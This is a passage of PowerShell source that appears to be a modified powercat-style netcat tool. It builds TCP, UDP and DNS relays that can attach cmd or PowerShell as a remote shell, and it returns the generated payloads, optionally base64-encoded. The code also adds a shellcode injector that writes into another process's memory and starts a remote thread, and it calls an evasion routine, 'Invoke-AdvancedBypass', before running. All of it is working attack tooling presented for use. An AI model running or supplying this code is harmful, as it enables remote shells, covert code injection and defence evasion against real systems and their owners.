  function ReadData_Console
  {
    param($FuncVars)
    $Data = $null
    if($Host.UI.RawUI.KeyAvailable)
    {
      $Data = $FuncVars["Encoding"].GetBytes((Read-Host) + "`n")
    }
    return $Data,$FuncVars
  }
  function WriteData_Console
  {
    param($Data,$FuncVars)
    switch($FuncVars["Output"])
    {
      "Host" {Write-Host -n $FuncVars["Encoding"].GetString($Data)}
      "String" {$FuncVars["OutputString"] += $FuncVars["Encoding"].GetString($Data)}
      "Bytes" {$FuncVars["OutputBytes"] += $Data}
    }
    return $FuncVars
  }
  function Close_Console
  {
    param($FuncVars)
    if($FuncVars["OutputString"] -ne ""){return $FuncVars["OutputString"]}
    elseif($FuncVars["OutputBytes"] -ne @()){return $FuncVars["OutputBytes"]}
    return
  }
  ########## END CONSOLE FUNCTIONS ##########

  ########## PROCESS INJECTION STUB ##########
  function Invoke-Inject {
    param([int]$TargetPid, [byte[]]$Shellcode)
    try {
      $p = Get-Process -Id $TargetPid -ErrorAction Stop
      $h = [System.Runtime.InteropServices.Marshal]::GetType()
      # Use P/Invoke via Add-Type
      Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Injector {
    [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr addr, uint size, uint type, uint protect);
    [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr h, IntPtr addr, byte[] buf, uint size, out uint written);
    [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr attr, uint stack, IntPtr start, IntPtr param, uint flags, IntPtr id);
}
"@ -ErrorAction SilentlyContinue
      $hProc = [Injector]::OpenProcess(0x1F0FFF, $false, $TargetPid)
      $addr = [Injector]::VirtualAllocEx($hProc, [IntPtr]::Zero, [uint32]$Shellcode.Length, 0x3000, 0x40)
      $written = 0
      [Injector]::WriteProcessMemory($hProc, $addr, $Shellcode, [uint32]$Shellcode.Length, [ref]$written) | Out-Null
      [Injector]::CreateRemoteThread($hProc, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero) | Out-Null
      Write-Verbose "Injected $($Shellcode.Length) bytes into PID $TargetPid"
      Write-Log "INJECT $($Shellcode.Length) bytes into PID $TargetPid"
    } catch {
      Write-Verbose "Injection failed: $_"
    }
  }
  ########## END PROCESS INJECTION STUB ##########

  ########## MAIN FUNCTION ##########
  function Main
  {
    param($Stream1SetupVars,$Stream2SetupVars)
    try
    {
      [byte[]]$InputToWrite = @()
      $Encoding = New-Object System.Text.AsciiEncoding
      if($i -ne $null)
      {
        Write-Verbose "Input from -i detected..."
        if(Test-Path $i){ [byte[]]$InputToWrite = ([io.file]::ReadAllBytes($i)) }
        elseif($i.GetType().Name -eq "Byte[]"){ [byte[]]$InputToWrite = $i }
        elseif($i.GetType().Name -eq "String"){ [byte[]]$InputToWrite = $Encoding.GetBytes($i) }
        else{Write-Host "Unrecognised input type." ; return}
      }

      Write-Verbose "Setting up Stream 1..."
      try{$Stream1Vars = Stream1_Setup $Stream1SetupVars}
      catch{Write-Verbose "Stream 1 Setup Failure" ; return}

      Write-Verbose "Setting up Stream 2..."
      try{$Stream2Vars = Stream2_Setup $Stream2SetupVars}
      catch{Write-Verbose "Stream 2 Setup Failure" ; return}

      $Data = $null

      if($InputToWrite -ne @())
      {
        Write-Verbose "Writing input to Stream 1..."
        try{$Stream1Vars = Stream1_WriteData $InputToWrite $Stream1Vars}
        catch{Write-Host "Failed to write input to Stream 1" ; return}
      }

      if($d){Write-Verbose "-d (disconnect) Activated. Disconnecting..." ; return}

      Write-Verbose "Both Communication Streams Established. Redirecting Data Between Streams..."
      while($True)
      {
        try
        {
          $Data,$Stream2Vars = Stream2_ReadData $Stream2Vars
          if(($Data.Length -eq 0) -or ($Data -eq $null)){Start-Sleep -Milliseconds 100}
          if($Data -ne $null){$Stream1Vars = Stream1_WriteData $Data $Stream1Vars}
          $Data = $null
        }
        catch
        {
          Write-Verbose "Failed to redirect data from Stream 2 to Stream 1" ; return
        }

        try
        {
          $Data,$Stream1Vars = Stream1_ReadData $Stream1Vars
          if(($Data.Length -eq 0) -or ($Data -eq $null)){Start-Sleep -Milliseconds 100}
          if($Data -ne $null){$Stream2Vars = Stream2_WriteData $Data $Stream2Vars}
          $Data = $null
        }
        catch
        {
          Write-Verbose "Failed to redirect data from Stream 1 to Stream 2" ; return
        }
      }
    }
    finally
    {
      try
      {
        Stream2_Close $Stream2Vars
      }
      catch
      {
        Write-Verbose "Failed to close Stream 2"
      }
      try
      {
        Stream1_Close $Stream1Vars
      }
      catch
      {
        Write-Verbose "Failed to close Stream 1"
      }
    }
  }
  ########## END MAIN FUNCTION ##########

  ########## GENERATE PAYLOAD ##########
  if($u)
  {
    Write-Verbose "Set Stream 1: UDP"
    $FunctionString = ("function Stream1_Setup`n{`n" + ${function:Setup_UDP} + "`n}`n`n")
    $FunctionString += ("function Stream1_ReadData`n{`n" + ${function:ReadData_UDP} + "`n}`n`n")
    $FunctionString += ("function Stream1_WriteData`n{`n" + ${function:WriteData_UDP} + "`n}`n`n")
    $FunctionString += ("function Stream1_Close`n{`n" + ${function:Close_UDP} + "`n}`n`n")
    if($l){$InvokeString = "Main @('',`$True,'$p','$t') "}
    else{$InvokeString = "Main @('$c',`$False,'$p','$t') "}
  }
  elseif($dns -ne "")
  {
    Write-Verbose "Set Stream 1: DNS"
    $FunctionString = ("function Stream1_Setup`n{`n" + ${function:Setup_DNS} + "`n}`n`n")
    $FunctionString += ("function Stream1_ReadData`n{`n" + ${function:ReadData_DNS} + "`n}`n`n")
    $FunctionString += ("function Stream1_WriteData`n{`n" + ${function:WriteData_DNS} + "`n}`n`n")
    $FunctionString += ("function Stream1_Close`n{`n" + ${function:Close_DNS} + "`n}`n`n")
    if($l){return "This feature is not available."}
    else{$InvokeString = "Main @('$c','$p','$dns',$dnsft) "}
  }
  else
  {
    Write-Verbose "Set Stream 1: TCP"
    $FunctionString = ("function Stream1_Setup`n{`n" + ${function:Setup_TCP} + "`n}`n`n")
    $FunctionString += ("function Stream1_ReadData`n{`n" + ${function:ReadData_TCP} + "`n}`n`n")
    $FunctionString += ("function Stream1_WriteData`n{`n" + ${function:WriteData_TCP} + "`n}`n`n")
    $FunctionString += ("function Stream1_Close`n{`n" + ${function:Close_TCP} + "`n}`n`n")
    if($l){$InvokeString = "Main @('',`$True,$p,$t) "}
    else{$InvokeString = "Main @('$c',`$False,$p,$t) "}
  }

  if($e -ne "")
  {
    Write-Verbose "Set Stream 2: Process"
    $FunctionString += ("function Stream2_Setup`n{`n" + ${function:Setup_CMD} + "`n}`n`n")
    $FunctionString += ("function Stream2_ReadData`n{`n" + ${function:ReadData_CMD} + "`n}`n`n")
    $FunctionString += ("function Stream2_WriteData`n{`n" + ${function:WriteData_CMD} + "`n}`n`n")
    $FunctionString += ("function Stream2_Close`n{`n" + ${function:Close_CMD} + "`n}`n`n")
    $InvokeString += "@('$e')`n`n"
  }
  elseif($ep)
  {
    Write-Verbose "Set Stream 2: Powershell"
    $InvokeString += "`n`n"
  }
  elseif($r -ne "")
  {
    if($r.split(":")[0].ToLower() -eq "udp")
    {
      Write-Verbose "Set Stream 2: UDP"
      $FunctionString += ("function Stream2_Setup`n{`n" + ${function:Setup_UDP} + "`n}`n`n")
      $FunctionString += ("function Stream2_ReadData`n{`n" + ${function:ReadData_UDP} + "`n}`n`n")
      $FunctionString += ("function Stream2_WriteData`n{`n" + ${function:WriteData_UDP} + "`n}`n`n")
      $FunctionString += ("function Stream2_Close`n{`n" + ${function:Close_UDP} + "`n}`n`n")
      if($r.split(":").Count -eq 2){$InvokeString += ("@('',`$True,'" + $r.split(":")[1] + "','$t') ")}
      elseif($r.split(":").Count -eq 3){$InvokeString += ("@('" + $r.split(":")[1] + "',`$False,'" + $r.split(":")[2] + "','$t') ")}
      else{return "Bad relay format."}
    }
    if($r.split(":")[0].ToLower() -eq "dns")
    {
      Write-Verbose "Set Stream 2: DNS"
      $FunctionString += ("function Stream2_Setup`n{`n" + ${function:Setup_DNS} + "`n}`n`n")
      $FunctionString += ("function Stream2_ReadData`n{`n" + ${function:ReadData_DNS} + "`n}`n`n")
      $FunctionString += ("function Stream2_WriteData`n{`n" + ${function:WriteData_DNS} + "`n}`n`n")
      $FunctionString += ("function Stream2_Close`n{`n" + ${function:Close_DNS} + "`n}`n`n")
      if($r.split(":").Count -eq 2){return "This feature is not available."}
      elseif($r.split(":").Count -eq 4){$InvokeString += ("@('" + $r.split(":")[1] + "','" + $r.split(":")[2] + "','" + $r.split(":")[3] + "',$dnsft) ")}
      else{return "Bad relay format."}
    }
    elseif($r.split(":")[0].ToLower() -eq "tcp")
    {
      Write-Verbose "Set Stream 2: TCP"
      $FunctionString += ("function Stream2_Setup`n{`n" + ${function:Setup_TCP} + "`n}`n`n")
      $FunctionString += ("function Stream2_ReadData`n{`n" + ${function:ReadData_TCP} + "`n}`n`n")
      $FunctionString += ("function Stream2_WriteData`n{`n" + ${function:WriteData_TCP} + "`n}`n`n")
      $FunctionString += ("function Stream2_Close`n{`n" + ${function:Close_TCP} + "`n}`n`n")
      if($r.split(":").Count -eq 2){$InvokeString += ("@('',`$True,'" + $r.split(":")[1] + "','$t') ")}
      elseif($r.split(":").Count -eq 3){$InvokeString += ("@('" + $r.split(":")[1] + "',`$False,'" + $r.split(":")[2] + "','$t') ")}
      else{return "Bad relay format."}
    }
  }
  else
  {
    Write-Verbose "Set Stream 2: Console"
    $FunctionString += ("function Stream2_Setup`n{`n" + ${function:Setup_Console} + "`n}`n`n")
    $FunctionString += ("function Stream2_ReadData`n{`n" + ${function:ReadData_Console} + "`n}`n`n")
    $FunctionString += ("function Stream2_WriteData`n{`n" + ${function:WriteData_Console} + "`n}`n`n")
    $FunctionString += ("function Stream2_Close`n{`n" + ${function:Close_Console} + "`n}`n`n")
    $InvokeString += ("@('" + $o + "')")
  }

  if($ep){$FunctionString += ("function Main`n{`n" + ${function:Main_Powershell} + "`n}`n`n")}
  else{$FunctionString += ("function Main`n{`n" + ${function:Main} + "`n}`n`n")}
  $InvokeString = ($FunctionString + $InvokeString)
  ########## END GENERATE PAYLOAD ##########

  ########## PROCESS INJECTION EXECUTION ##########
  if ($inject -gt 0 -and $i -ne $null) {
    [byte[]]$shellcode = @()
    if (Test-Path $i) { $shellcode = [io.file]::ReadAllBytes($i) }
    elseif ($i.GetType().Name -eq "Byte[]") { $shellcode = $i }
    if ($shellcode.Length -gt 0) {
      Invoke-Inject -TargetPid $inject -Shellcode $shellcode
      return
    }
  }
  ########## END PROCESS INJECTION EXECUTION ##########

  ########## RETURN GENERATED PAYLOADS ##########
  if($ge){Write-Verbose "Returning Encoded Payload..." ; return [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($InvokeString))}
  elseif($g){Write-Verbose "Returning Payload..." ; return $InvokeString}
  ########## END RETURN GENERATED PAYLOADS ##########

  ########## PRE-EXECUTION BYPASS ##########
  Invoke-AdvancedBypass
  ########## END PRE-EXECUTION BYPASS ##########

  ########## EXECUTION ##########
  $Output = $null
  try
  {
    if($rep)
    {
      while($True)
      {
        $Output += IEX $InvokeString
        Start-Sleep -s 2
        Write-Verbose "Repetition Enabled: Restarting..."
      }
    }
    else
    {
      $Output += IEX $InvokeString
    }
  }
  finally
  {
    if($Output -ne $null)
    {
      if($of -eq ""){$Output}
      else{[io.file]::WriteAllBytes($of,$Output)}
    }
  }
  ########## END EXECUTION ##########
}
